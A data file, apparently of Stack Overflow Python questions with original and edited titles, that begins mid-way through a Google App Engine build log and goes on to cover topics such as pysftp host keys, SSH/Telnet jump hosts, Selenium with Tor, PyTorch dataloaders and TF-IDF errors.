""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO new_descriptor_contents: Step #1 - ""builder"": Step #1 - ""builder"": gunicornStep #1 - ""builder"": Step #1 - ""builder"": wrapt==1.10.11Step #1 - ""builder"": virtualenv==16.0.0Step #1 - ""builder"": urllib3==1.23Step #1 - ""builder"": uritemplate==3.0.0Step #1 - ""builder"": typed-ast==1.1.0Step #1 - ""builder"": social-auth-core==2.0.0Step #1 - ""builder"": social-auth-app-django==3.1.0Step #1 - ""builder"": six==1.11.0Step #1 - ""builder"": simplejson==3.16.0Step #1 - ""builder"": s3transfer==0.1.13Step #1 - ""builder"": requests-oauthlib==1.0.0Step #1 - ""builder"": requests==2.19.1Step #1 - ""builder"": pytz==2018.5Step #1 - ""builder"": python3-openid==3.1.0Step #1 - ""builder"": python-social-auth==0.3.6Step #1 - ""builder"": python-dateutil==2.7.5Step #1 - ""builder"": PyMySQL==0.9.2Step #1 - ""builder"": pylint==2.2.2Step #1 - ""builder"": PyJWT==1.6.4Step #1 - ""builder"": pycparser==2.19Step #1 - ""builder"": Pillow==5.3.0Step #1 - ""builder"": openapi-codec==1.3.2Step #1 - ""builder"": oauthlib==2.1.0Step #1 - ""builder"": mccabe==0.6.1Step #1 - ""builder"": MarkupSafe==1.0Step #1 - ""builder"": lxml==4.2.5Step #1 - ""builder"": lazy-object-proxy==1.3.1Step #1 - ""builder"": jmespath==0.9.3Step #1 - ""builder"": Jinja2==2.10Step #1 - ""builder"": itypes==1.1.0Step #1 - ""builder"": isort==4.3.4Step #1 - ""builder"": idna==2.7Step #1 - ""builder"": docutils==0.14Step #1 - ""builder"": djangorestframework-jwt==1.11.0Step #1 - ""builder"": djangorestframework==3.8.2Step #1 - ""builder"": django-rest-swagger==2.0.7Step #1 - ""builder"": django-rest-auth==0.9.3Step #1 - ""builder"": django-filter==2.0.0Step #1 - ""builder"": django-allauth==0.36.0Step #1 - ""builder"": Django==2.1Step #1 - ""builder"": defusedxml==0.5.0Step #1 - ""builder"": cryptography==2.4.2Step #1 - ""builder"": coreschema==0.0.4Step #1 - ""builder"": colorama==0.4.1Step #1 - ""builder"": chardet==3.0.4Step #1 - ""builder"": cffi==1.11.5Step #1 - ""builder"": certifi==2018.8.13Step #1 - ""builder"": botocore==1.12.55Step #1 - ""builder"": boto3==1.9.55Step #1 - ""builder"": astroid==2.1.0Step #1 - ""builder"": INFO descriptor_contents:Step #1 - ""builder"": INFO starting: checking_cached_requirements.txt_layerStep #1 - ""builder"": INFO checking_cached_interpreter_layer took 1 secondsStep #1 - ""builder"": INFO [CACHE][HIT] v0.10.0:PYTHON (interpreter)->857ad57bf9cd453430b0abd26875a38ffddc81f8f6f24cacd8d232e721414cd2Step #1 - ""builder"": INFO check python version took 0 secondsStep #1 - ""builder"": Step #1 - ""builder"": INFO `python version` stderr:Step #1 - ""builder"": /opt/python3.7/bin/python3.7 --versionStep #1 - ""builder"": INFO `python version` full cmd:Step #1 - ""builder"": INFO starting: check python versionStep #1 - ""builder"": INFO {""architecture"": ""amd64"", ""author"": ""Bazel"", ""config"": {}, ""created"": ""2018-12-03T15:00:00Z"", ""env"": ""/env"", ""history"": [{""author"": ""Bazel"", ""created"": ""1970-01-01T00:00:00Z"", ""created_by"": ""bazel build ...""}], ""os"": ""linux"", ""rootfs"": {""diff_ids"": [""sha256:1e388551b9f8421969265b252263c9f4222e12ae6e6e840013a12e701f8ca2eb""]}}Step #1 - ""builder"": INFO Found cached dependency layer for 857ad57bf9cd453430b0abd26875a38ffddc81f8f6f24cacd8d232e721414cd2Step #1 - ""builder"": INFO Found cached base image: asia.gcr.io/e2isapjango/app-engine-tmp/build-cache/ttl-7d/python-cache:857ad57bf9cd453430b0abd26875a38ffddc81f8f6f24cacd8d232e721414cd2.Step #1 - ""builder"": DEBUG Checking cache for cache_key 857ad57bf9cd453430b0abd26875a38ffddc81f8f6f24cacd8d232e721414cd2Step #1 - ""builder"": INFO check python version took 0 secondsStep #1 - ""builder"": Step #1 - ""builder"": INFO `python version` stderr:Step #1 - ""builder"": /opt/python3.7/bin/python3.7 --versionStep #1 - ""builder"": INFO `python version` full cmd:Step #1 - ""builder"": INFO starting: check python versionStep #1 - ""builder"": INFO starting: checking_cached_interpreter_layerStep #1 - ""builder"": INFO starting: build process for FTL imageStep #1 - ""builder"": INFO builder initialization took 0 secondsStep #1 - ""builder"": INFO Loading Docker credentials for repository 'asia.gcr.io/e2isapjango/app-engine-tmp/app/ttl-2h:b91b613d-04af-4bef-9bad-4c3d409c7ba4'Step #1 - ""builder"": INFO Loading Docker credentials for repository 'gcr.io/gae-runtimes/python37:python37_3_7_1_20181112_RC01'Step #1 - ""builder"": INFO starting: builder initializationStep #1 - ""builder"": INFO starting: full buildStep #1 - ""builder"": INFO FTL arg passed: verbosity DEBUGStep #1 - ""builder"": INFO FTL arg passed: additional_directory /.gaeconfigStep #1 - ""builder"": INFO FTL arg passed: directory /workspaceStep #1 - ""builder"": INFO FTL arg passed: output_path NoneStep #1 - ""builder"": INFO FTL arg passed: fail_on_error TrueStep #1 - ""builder"": INFO FTL arg passed: upload TrueStep #1 - ""builder"": INFO FTL arg passed: global_cache FalseStep #1 - ""builder"": INFO FTL arg passed: name asia.gcr.io/e2isapjango/app-engine-tmp/app/ttl-2h:b91b613d-04af-4bef-9bad-4c3d409c7ba4Step #1 - ""builder"": INFO FTL arg passed: venv_cmd /opt/python3.7/bin/python3.7 -m virtualenvStep #1 - ""builder"": INFO FTL arg passed: cache_repository asia.gcr.io/e2isapjango/app-engine-tmp/build-cache/ttl-7dStep #1 - ""builder"": INFO FTL arg passed: cache_salt Step #1 - ""builder"": INFO FTL arg passed: cache_key_version v0.10.0Step #1 - ""builder"": INFO FTL arg passed: base gcr.io/gae-runtimes/python37:python37_3_7_1_20181112_RC01Step #1 - ""builder"": INFO FTL arg passed: sh_c_prefix FalseStep #1 - ""builder"": INFO FTL arg passed: destination_path /srvStep #1 - ""builder"": INFO FTL arg passed: builder_output_path /builder/outputsStep #1 - ""builder"": INFO FTL arg passed: tar_base_image_path NoneStep #1 - ""builder"": INFO FTL arg passed: pip_cmd /env/bin/python3.7 -m pipStep #1 - ""builder"": INFO FTL arg passed: exposed_ports NoneStep #1 - ""builder"": INFO FTL arg passed: entrypoint /startStep #1 - ""builder"": INFO FTL arg passed: venv_dir /envStep #1 - ""builder"": INFO FTL arg passed: cache TrueStep #1 - ""builder"": INFO FTL arg passed: python_cmd /opt/python3.7/bin/python3.7Step #1 - ""builder"": INFO Beginning FTL build for pythonStep #1 - ""builder"": INFO FTL version python-v0.10.0Step #1 - ""builder"": 03 Dec 2018 16:05:22 INFO Executing ['/ftl-v0.10.0.par', '--name=asia.gcr.io/e2isapjango/app-engine-tmp/app/ttl-2h:b91b613d-04af-4bef-9bad-4c3d409c7ba4', '--destination=/srv', '--cache-repository=asia.gcr.io/e2isapjango/app-engine-tmp/build-cache/ttl-7d', '--cache', '--python-cmd=/opt/python3.7/bin/python3.7', '--pip-cmd=/env/bin/python3.7 -m pip', '--virtualenv-cmd=/opt/python3.7/bin/python3.7 -m virtualenv', '-v=DEBUG', '--base=gcr.io/gae-runtimes/python37:python37_3_7_1_20181112_RC01', '--entrypoint=/start', '--directory=/workspace', '--additional-directory=/.gaeconfig']Step #1 - ""builder"": 03 Dec 2018 16:05:22 INFO Entrypoint: {'type': 'default'}Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'w\x00r\x00a\x00p\x00t\x00=\x00=\x001\x00.\x001\x000\x00.\x001\x001\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'v\x00i\x00r\x00t\x00u\x00a\x00l\x00e\x00n\x00v\x00=\x00=\x001\x006\x00.\x000\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'u\x00r\x00l\x00l\x00i\x00b\x003\x00=\x00=\x001\x00.\x002\x003\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'u\x00r\x00i\x00t\x00e\x00m\x00p\x00l\x00a\x00t\x00e\x00=\x00=\x003\x00.\x000\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 't\x00y\x00p\x00e\x00d\x00-\x00a\x00s\x00t\x00=\x00=\x001\x00.\x001\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 's\x00o\x00c\x00i\x00a\x00l\x00-\x00a\x00u\x00t\x00h\x00-\x00c\x00o\x00r\x00e\x00=\x00=\x002\x00.\x000\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 's\x00o\x00c\x00i\x00a\x00l\x00-\x00a\x00u\x00t\x00h\x00-\x00a\x00p\x00p\x00-\x00d\x00j\x00a\x00n\x00g\x00o\x00=\x00=\x003\x00.\x001\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 's\x00i\x00x\x00=\x00=\x001\x00.\x001\x001\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 's\x00i\x00m\x00p\x00l\x00e\x00j\x00s\x00o\x00n\x00=\x00=\x003\x00.\x001\x006\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 's\x003\x00t\x00r\x00a\x00n\x00s\x00f\x00e\x00r\x00=\x00=\x000\x00.\x001\x00.\x001\x003\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'r\x00e\x00q\x00u\x00e\x00s\x00t\x00s\x00-\x00o\x00a\x00u\x00t\x00h\x00l\x00i\x00b\x00=\x00=\x001\x00.\x000\x00.\x000\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'r\x00e\x00q\x00u\x00e\x00s\x00t\x00s\x00=\x00=\x002\x00.\x001\x009\x00.\x001\x00\r\x00'Step #1 - ""builder"": 03 Dec 2018 16:05:22 WARNING Failed to parse requirement: 'p\x00y\x00t\x00z\x00=\x00=\x002\x000\x001\x008\x00.\x005\x00\r\x00'",Google App Engine Python 3.7 build error: `pip_download_wheels` returned code: 1
Down-sample mri T1 image in python with nibabel / nilearn," I have a T1 image (NIFTI), already aligned, with dimension 121 x 145 x 121.The image is loaded by nibabel. The voxel size is 1.5 x 1.5 x 1.5 mm.I want to down-sample it to an image with 2.0 x 2.0 x 2.0 mm resolution and keep the images aligned.I have little knowledge in MRI image manipulation.I couldn't find a clear tutorial.How do I do that ?If you know any other Python library that can do it, it would also work. <code> ",Down-sample mri T1 image in python with Nipy
What is the correct order for actual and expeted in pytest?," This question gives the order assertEqual(expected, actual), albeit for the unittest package. But Pycharm, with pytest, prints out ""Expected:..."" and ""Actual..."" based on the order actual==expected.This is confusing. What is the correct ordering for pytest? The source code and online documentation do not say.(I note also that JUnit and TestNG disagree on this.) <code> ",What is the correct order for actual and expected in pytest?
Use paramiko AutoAddPolicy with pysftp," This code is not working: This is the exception: I get the exception before I try to set the host_key_policy.I could not find a different way to access the client instance via pysftp.Is there a way to set AutoAddPolicy before I get the exception?There is a related question. My question is about how to apply one of the several solutions which are provided in the old question. <code>  def sftp_connection(self): import pysftp connection = pysftp.Connection(self.host, username=self.system_name, private_key=os.path.join(HOME, '.ssh', 'id_rsa')) # in the next lines I try to use AutoAddPolicy client = connection.sftp_client() client.load_host_keys(os.path.expanduser('~/.ssh/known_hosts')) client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy) return connection Traceback (most recent call last): File ""/home/u/src/myapp-glo/myapp_doxis_archiv/tests/test_doxis_archiv.py"", line 85, in test_beleg_to_archiv__ftpservercontext info_dict = beleg_to_archiv(beleg, self.archiv_belegart) File ""/home/u/src/myapp-glo/myapp_doxis_archiv/beleg_to_archiv.py"", line 28, in beleg_to_archiv transfer_log=send_data_via_ftp(temp_directory, archiv_belegart.doxis_archiv) File ""/home/u/src/myapp-glo/myapp_doxis_archiv/beleg_to_archiv.py"", line 71, in send_data_via_ftp with doxis_archiv.sftp_connection() as sftp: File ""/home/u/src/myapp-glo/myapp_doxis_archiv/models.py"", line 43, in sftp_connection private_key=os.path.join(HOME, '.ssh', 'id_rsa')) File ""/home/u/local/lib/python2.7/site-packages/pysftp/__init__.py"", line 132, in __init__ self._tconnect['hostkey'] = self._cnopts.get_hostkey(host) File ""/home/u/local/lib/python2.7/site-packages/pysftp/__init__.py"", line 71, in get_hostkey raise SSHException(""No hostkey for host %s found."" % host)SSHException: No hostkey for host localhost found.",Use Paramiko AutoAddPolicy with pysftp
Is is safe to use next within a for loop in Python?," Consider the following Python code: Which will print 3, 5, and 7. Is the use of next on the variable being iterated on a reliable construct (you may assume that a StopIteration exception is not a concern or will be handled), or does the modification of the iterator being looped over inside the loop constitute a violation of some principle? <code>  b = [1,2,3,4,5,6,7]a = iter(b)for x in a : if (x % 2) == 0 : print(next(a))",Is it safe to use next within a for loop in Python?
nltk stop words in google colab giving error, First of all I am using Google colab for the work andI have downloaded nltk stopwords for English with following: The download was successful but when I run stop = stopwords.words('English')I am getting OSError: No such file or directory: '/root/nltk_data/corpora/stopwords/English' <code>  nltk.download('stopwords') [nltk_data] Downloading package stopwords to /root/nltk_data...,No such file or directory 'nltk_data/corpora/stopwords/English' when using colab
"Can all __future__ statements be removed from a python code, without affecting its functionality if using python 3.7.1?"," Can the following __future__ statements be removed from source code, without affecting its functionality if I am using python 3.7.1? <code>  from __future__ import nested_scopesfrom __future__ import generatorsfrom __future__ import divisionfrom __future__ import absolute_importfrom __future__ import with_statementfrom __future__ import print_functionfrom __future__ import unicode_literals","Can all __future__ statements be removed from python code, without affecting its functionality using python 3.7.1?"
How do I use Python libs such as Paramiko for chain connections with telnet and SSH," Similar to a question asked here:SSH and telnet to localhost using pythonI'm trying to find a solution to the following problem:From Server A (full rights) over Jumhost B (no sudo), I want to connect to several Network devices using Python (one after another is enough, it doesn't have to be in the same time). With SSH only this would be no problem but a lot of devices use Telnet only (I know that this isn't secure, but it wasn't my decision to do it like that).After research I came across multiple solutions for chain SSH connections, such as Paramiko, Netmiko, Pxssh etc. But I can't find a proper way to achieve the last step with Telnet. Currently I have the following code: With this I am able to chain through my Jumphost, but I don't know how to implement then a Telnet connection. Does anyone know a proper solution? <code>  class SSHTool():def __init__(self, host, user, auth, via=None, via_user=None, via_auth=None): if via: t0 = ssh.Transport(via) t0.start_client() t0.auth_password(via_user, via_auth) # setup forwarding from 127.0.0.1:<free_random_port> to |host| channel = t0.open_channel('direct-tcpip', host, ('127.0.0.1', 0)) self.transport = ssh.Transport(channel) else: self.transport = ssh.Transport(host) self.transport.start_client() self.transport.auth_password(user, auth)def run(self, cmd): ch = self.transport.open_session() ch.set_combine_stderr(True) ch.exec_command(cmd) retcode = ch.recv_exit_status() buf = '' while ch.recv_ready(): buf += str(ch.recv(1024)) return (buf, retcode)host = ('192.168.0.136', 22)via_host = ('192.168.0.213', 22)ssht = SSHTool(host, '', '',via=via_host, via_user='', via_auth='')output=ssht.run('ls')print(output)",How do I use Python libs such as Paramiko for chain connections with Telnet and SSH
"Pylint ""unresolved import"" error in visual studio code"," I am using the following setupmacOS v10.14 (Mojave)Python 3.7.1Visual Studio Code 1.30Pylint 2.2.2Django 2.1.4I want to use linting to make my life a bit easier in Visual Studio Code. However, for every import I have states ""unresolved import"". Even on default Django imports (i.e. from django.db import models).I presume it is because it is not seeing the virtual environment Python files.Everything works just fine, but it's starting to get annoying.The interpreter choices I have are all system versions of Python. It does not seem to see my virtual environment Python at all (it is not in the same directory as my workspace, so that part makes sense).If I set up the python.PythonPath in the settings.json file, it just ignores it and does not list my virtual environment path as an option. I also tried setting it up in my global Python settings, but it also does not show up.Is there a quick fix to get it working? <code> ","Pylint ""unresolved import"" error in Visual Studio Code"
Connect to TOR Browser using Python," I am trying to connect to a Tor browser but get an error stating ""proxyConnectFailure"" any ideas I have tried multiple attempts to get into the basics of Tor browser to get it connected but all in vain if any could help life could be saved big time: <code>  from selenium import webdriverfrom selenium.webdriver.firefox.firefox_profile import FirefoxProfilefrom selenium.webdriver.firefox.firefox_binary import FirefoxBinarybinary = FirefoxBinary(r""C:\Users\Admin\Desktop\Tor Browser\Browser\firefox.exe"")profile = FirefoxProfile(r""C:\Users\Admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default"")# Configured profile settings.proxyIP = ""127.0.0.1""proxyPort = 9150proxy_settings = {""network.proxy.type"":1, ""network.proxy.socks"": proxyIP, ""network.proxy.socks_port"": proxyPort, ""network.proxy.socks_remote_dns"": True,}driver = webdriver.Firefox(firefox_binary=binary,proxy=proxy_settings)def interactWithSite(driver): driver.get(""https://www.google.com"") driver.save_screenshot(""screenshot.png"")interactWithSite(driver)",How to connect to Tor browser using Python
How to connect to TOR Browser using Python," I am trying to connect to a Tor browser but get an error stating ""proxyConnectFailure"" any ideas I have tried multiple attempts to get into the basics of Tor browser to get it connected but all in vain if any could help life could be saved big time: <code>  from selenium import webdriverfrom selenium.webdriver.firefox.firefox_profile import FirefoxProfilefrom selenium.webdriver.firefox.firefox_binary import FirefoxBinarybinary = FirefoxBinary(r""C:\Users\Admin\Desktop\Tor Browser\Browser\firefox.exe"")profile = FirefoxProfile(r""C:\Users\Admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Browser\profile.default"")# Configured profile settings.proxyIP = ""127.0.0.1""proxyPort = 9150proxy_settings = {""network.proxy.type"":1, ""network.proxy.socks"": proxyIP, ""network.proxy.socks_port"": proxyPort, ""network.proxy.socks_remote_dns"": True,}driver = webdriver.Firefox(firefox_binary=binary,proxy=proxy_settings)def interactWithSite(driver): driver.get(""https://www.google.com"") driver.save_screenshot(""screenshot.png"")interactWithSite(driver)",How to connect to Tor browser using Python
can't use Tfidf in text classification," I tried to predict different classes of the entry messages and I worked on the Persian language. I used Tfidf and Naive-Bayes to classify my input data. Here is my code: But when I run the above code it throws the following exception while I expect to give me ""ads"" class in the output: Traceback (most recent call last): File "".../multiclass-main.py"", line 27, in X_train_counts=cv.fit_transform(X_train) File ""...\sklearn\feature_extraction\text.py"", line 1012, in fit_transform self.fixed_vocabulary_) File ""...sklearn\feature_extraction\text.py"", line 922, in _count_vocab for feature in analyze(doc): File ""...sklearn\feature_extraction\text.py"", line 308, in tokenize(preprocess(self.decode(doc))), stop_words) File ""...sklearn\feature_extraction\text.py"", line 256, in return lambda x: strip_accents(x.lower()) AttributeError: 'int' object has no attribute 'lower'how can I use Tfidf and CountVectorizer in this project? <code>  import pandas as pddf=pd.read_excel('dataset.xlsx')col=['label','body']df=df[col]df.columns=['label','body']df['class_type'] = df['label'].factorize()[0]class_type_df=df[['label','class_type']].drop_duplicates().sort_values('class_type')class_type_id = dict(class_type_df.values)id_to_class_type = dict(class_type_df[['class_type', 'label']].values)from sklearn.feature_extraction.text import TfidfVectorizertfidf = TfidfVectorizer()features=tfidf.fit_transform(df.body).toarray()classtype=df.class_typeprint(features.shape)from sklearn.model_selection import train_test_splitfrom sklearn.feature_extraction.text import CountVectorizerfrom sklearn.feature_extraction.text import TfidfTransformerfrom sklearn.naive_bayes import MultinomialNB X_train,X_test,y_train,y_test=train_test_split(df['body'],df['label'],random_state=0)cv=CountVectorizer()X_train_counts=cv.fit_transform(X_train)tfidf_transformer=TfidfTransformer()X_train_tfidf = tfidf_transformer.fit_transform(X_train_counts)clf = MultinomialNB().fit(X_train_tfidf, y_train)print(clf.predict(cv.transform(["" ""])))",AttributeError: 'int' object has no attribute 'lower' in TFIDF and CountVectorizer
How does number of workers in pytorch work?," If num_workers is 2, Does that mean that it will put 2 batches in the RAM and send 1 of them to the GPU or Does it put 3 batches in the RAM then sends 1 of them to the GPU?What does actually happen when the number of workers is higher than the number of CPU cores? I tried it and it worked fine but How does it work? (I thought that the maximum number of workers I can choose is the number of cores).If I set num_workers to 3 and during the training there were no batches in the memory for the GPU, Does the main process waits for its workers to read the batches or Does it read a single batch (without waiting for the workers)? <code> ","How does the ""number of workers"" parameter in PyTorch dataloader actually work?"
How does number of workers in pytorch actually work?," If num_workers is 2, Does that mean that it will put 2 batches in the RAM and send 1 of them to the GPU or Does it put 3 batches in the RAM then sends 1 of them to the GPU?What does actually happen when the number of workers is higher than the number of CPU cores? I tried it and it worked fine but How does it work? (I thought that the maximum number of workers I can choose is the number of cores).If I set num_workers to 3 and during the training there were no batches in the memory for the GPU, Does the main process waits for its workers to read the batches or Does it read a single batch (without waiting for the workers)? <code> ","How does the ""number of workers"" parameter in PyTorch dataloader actually work?"
"Selenium `driver.page_source` doesn't show the same content as ""View Page Source"" in Firefox"," If I browse to https://httpbin.org/headers I expect to get the following JSON response: However, if I use Selenium I get Where do the HTML tags come from? How do I get the raw JSON response of a HTTP request from driver.page_source? <code>  { ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }} from selenium import webdriverfrom selenium.webdriver.firefox.options import Optionsoptions = Options()options.headless = Truedriver = webdriver.Firefox(options=options)url = 'https://httpbin.org/headers'driver.get(url)print(driver.page_source)driver.close() <html platform=""linux"" class=""theme-light"" dir=""ltr""><head><meta http-equiv=""Content-Security-Policy"" content=""default-src 'none' ; script-src resource:; ""><link rel=""stylesheet"" type=""text/css"" href=""resource://devtools-client-jsonview/css/main.css""><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""viewer-config"" src=""resource://devtools-client-jsonview/viewer-config.js""></script><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""json-viewer"" src=""resource://devtools-client-jsonview/json-viewer.js""></script></head><body><div id=""content""><div id=""json"">{ ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }}</div></div><script src=""resource://devtools-client-jsonview/lib/require.js"" data-main=""resource://devtools-client-jsonview/viewer-config.js""></script></body></html>",How to get the raw JSON response of a HTTP request from `driver.page_source` in Selenium webdriver Firefox
"Selenium `driver.page_source` doesn't show the same content as ""View Page Source"" in Firefox when viewing a JSON response"," If I browse to https://httpbin.org/headers I expect to get the following JSON response: However, if I use Selenium I get Where do the HTML tags come from? How do I get the raw JSON response of a HTTP request from driver.page_source? <code>  { ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }} from selenium import webdriverfrom selenium.webdriver.firefox.options import Optionsoptions = Options()options.headless = Truedriver = webdriver.Firefox(options=options)url = 'https://httpbin.org/headers'driver.get(url)print(driver.page_source)driver.close() <html platform=""linux"" class=""theme-light"" dir=""ltr""><head><meta http-equiv=""Content-Security-Policy"" content=""default-src 'none' ; script-src resource:; ""><link rel=""stylesheet"" type=""text/css"" href=""resource://devtools-client-jsonview/css/main.css""><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""viewer-config"" src=""resource://devtools-client-jsonview/viewer-config.js""></script><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""json-viewer"" src=""resource://devtools-client-jsonview/json-viewer.js""></script></head><body><div id=""content""><div id=""json"">{ ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }}</div></div><script src=""resource://devtools-client-jsonview/lib/require.js"" data-main=""resource://devtools-client-jsonview/viewer-config.js""></script></body></html>",How to get the raw JSON response of a HTTP request from `driver.page_source` in Selenium webdriver Firefox
How to get the raw JSON response of a HTTP request from `driver.page_source` in Selenium," If I browse to https://httpbin.org/headers I expect to get the following JSON response: However, if I use Selenium I get Where do the HTML tags come from? How do I get the raw JSON response of a HTTP request from driver.page_source? <code>  { ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }} from selenium import webdriverfrom selenium.webdriver.firefox.options import Optionsoptions = Options()options.headless = Truedriver = webdriver.Firefox(options=options)url = 'https://httpbin.org/headers'driver.get(url)print(driver.page_source)driver.close() <html platform=""linux"" class=""theme-light"" dir=""ltr""><head><meta http-equiv=""Content-Security-Policy"" content=""default-src 'none' ; script-src resource:; ""><link rel=""stylesheet"" type=""text/css"" href=""resource://devtools-client-jsonview/css/main.css""><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""viewer-config"" src=""resource://devtools-client-jsonview/viewer-config.js""></script><script type=""text/javascript"" charset=""utf-8"" async="""" data-requirecontext=""_"" data-requiremodule=""json-viewer"" src=""resource://devtools-client-jsonview/json-viewer.js""></script></head><body><div id=""content""><div id=""json"">{ ""headers"": { ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"", ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept-Language"": ""en-US,en;q=0.5"", ""Connection"": ""close"", ""Host"": ""httpbin.org"", ""Upgrade-Insecure-Requests"": ""1"", ""User-Agent"": ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0"" }}</div></div><script src=""resource://devtools-client-jsonview/lib/require.js"" data-main=""resource://devtools-client-jsonview/viewer-config.js""></script></body></html>",How to get the raw JSON response of a HTTP request from `driver.page_source` in Selenium webdriver Firefox
Unexpected Warning using Enum Functional API," Using the Functional API example given in documentation 8.13.12. I get the following Warning (using python 3.6). The code does work in the console but I'd rather not have warnings upon my code inspection. What am I doing wrong? And how can I get rid of the warning? Unexpected argument(s) Possible callees: Enum.new(cls: Enum, value) object(self: object) less... (Ctrl+F1) Inspection info: Reports discrepancies between declared parameters and actual arguments, as well as incorrect arguments (e.g. duplicate named arguments) and incorrect argument order. Decorators are analyzed, too <code>  from enum import EnumAnimal = Enum('Animal', 'ANT BEE CAT DOG')",Unexpected Warning using Enum Functional API - PyCharm Bug
